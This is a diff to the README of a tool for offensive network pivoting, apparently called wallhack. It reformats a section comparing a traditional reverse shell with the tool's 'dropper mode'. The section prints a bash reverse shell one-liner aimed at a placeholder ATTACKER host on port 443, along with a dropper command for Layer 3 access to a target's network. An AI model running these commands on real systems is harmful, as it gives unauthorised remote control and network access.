@@ -18,23 +18,15 @@ Establish reverse tunnels as simply as reverse shells. Drop, execute, and gain i
 
 ### Comparison
 
-{% grid cols=2 %}
-{% card title="Traditional Reverse Shell" icon="terminal" %}
-Provides a command prompt on the target host.
+**Traditional reverse shell** — command prompt on the target host only.
 ```bash
 bash -i >& /dev/tcp/ATTACKER/443 0>&1
 ```
-Limited to executing commands on the local host.
-{% /card %}
 
-{% card title="Dropper Mode" icon="parachute" %}
-Provides Layer 3 access to the entire network.
+**Dropper mode** — Layer 3 access to the entire network behind the target.
 ```bash
 wallhack-drop ATTACKER:443
 ```
-Enables scanning, pivoting, and exploitation across the network.
-{% /card %}
-{% /grid %}
 
 ## Features
 
